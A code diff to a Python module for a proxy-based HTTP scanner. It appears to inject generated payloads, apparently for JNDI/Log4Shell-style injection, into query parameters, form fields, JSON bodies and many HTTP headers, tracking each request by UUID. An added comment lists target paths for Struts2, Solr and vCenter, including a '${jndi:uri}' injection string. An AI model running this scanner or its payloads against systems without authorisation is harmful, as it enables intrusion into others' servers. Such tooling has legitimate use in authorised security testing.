@@ -8,10 +8,17 @@ import json
 import uuid
 
 from Lib.ModuleAPI import *
-from Lib.api import is_json
-from Lib.api import random_str, random_int
+from Lib.api import random_str, random_int, is_json
 from PostModule.Handle.proxyhttpscan import ProxyResponse, ProxyRequest
 
+"""
+# Apache Struts2
+/struts/utils.js
+# Apache Solr
+/solr/admin/cores?action=CREATE&wt=json&name=${jndi:uri}
+# VMWare VCenter
+/websso/SAML2/SSO/vsphere.local?SAMLRequest=
+"""
 
 class JsonReplace(object):
     def __init__(self):
@@ -125,13 +132,19 @@ class PostModule(ProxyHttpScanModule):
                    tag_en="Scan Headers", desc_en="Add payload to http headers"),
         OptionBool(name='LogRequest',
                    tag_zh="打印请求日志", desc_zh="打印Http请求到日志中",
-                   tag_en="Log Request", desc_en="Log http requests to logfile")
+                   tag_en="Log Request", desc_en="Log http requests to logfile"),
+        OptionInt(name='TIMEOUT',
+                  tag_zh="请求超时时间", desc_zh="每个Request请求超时时间(秒)",
+                  tag_en="Request Timeout", desc_en="Every http request timeout (seconds)",
+                  default=1),
     ])
 
     def __init__(self, custom_param):
         super().__init__(custom_param)
         self.headers = ['Referer', 'X-Api-Version', 'Accept-Charset', 'Accept-Datetime', 'Accept-Encoding',
-                        'Accept-Language', 'Cookie', 'Forwarded', 'Forwarded-For', 'Forwarded-For-Ip',
+                        'Accept-Language',
+                        # 'Cookie',
+                        'Forwarded', 'Forwarded-For', 'Forwarded-For-Ip',
                         'Forwarded-Proto', 'From', 'TE', 'True-Client-IP', 'Upgrade', 'User-Agent', 'Via', 'Warning',
                         'X-Api-Version', 'Max-Forwards', 'Origin', 'Pragma', 'DNT', 'Cache-Control', 'X-Att-Deviceid',
                         'X-ATT-DeviceId', 'X-Correlation-ID', 'X-Csrf-Token', 'X-CSRFToken', 'X-Do-Not-Track', 'X-Foo',
@@ -164,7 +177,10 @@ class PostModule(ProxyHttpScanModule):
     def callback(self, request: ProxyRequest, response: ProxyResponse, data=None):
         # data,额外需要传输的数据
         # 调用父类函数存储结果(必须调用)
-        log_flag = self.param("LogRequest")
+
+        request.log = self.param("LogRequest")
+        request.timeout = self.param("TIMEOUT")
+
         req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
         payloads = self.payload_list(req_uuid)
         uuid_data = {
@@ -175,7 +191,6 @@ class PostModule(ProxyHttpScanModule):
         }
         if request.method == "GET":
             if request.query:
-
                 uuid_data["DATA"] = {
                     "method": "GET",
                     "url": request.pretty_url,
@@ -185,12 +200,12 @@ class PostModule(ProxyHttpScanModule):
                 for payload in payloads:
                     for key in request.query:
                         request.query[key] = payload
-                    result = request.send(log=log_flag)
+                    result = request.send()
         elif request.method == "POST":
             if request.urlencoded_form:
 
                 uuid_data["DATA"] = {
-                    "method": "GET",
+                    "method": "POST",
                     "url": request.pretty_url,
                 }
                 UUIDJson.store_uuid_json(uuid_data)
@@ -198,7 +213,7 @@ class PostModule(ProxyHttpScanModule):
                 for payload in payloads:
                     for key in request.urlencoded_form:
                         request.urlencoded_form[key] = payload
-                    result = request.send(log=log_flag)
+                    result = request.send()
             else:
                 if is_json(request.text):
                     uuid_data["DATA"] = {
@@ -211,7 +226,7 @@ class PostModule(ProxyHttpScanModule):
                         old_dict = json.loads(request.text)
                         new_dict = JsonReplace().replace_inter(old_dict, payload)
                         request.text = json.dumps(new_dict)
-                        result = request.send(log=log_flag)
+                        result = request.send()
 
         if self.param("ScanHeader"):
             req_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
@@ -229,5 +244,5 @@ class PostModule(ProxyHttpScanModule):
             for payload in payloads:
                 for key in request.headers:
                     request.headers[key] = payload
-                result = request.send(log=log_flag)
+                result = request.send()
         return True
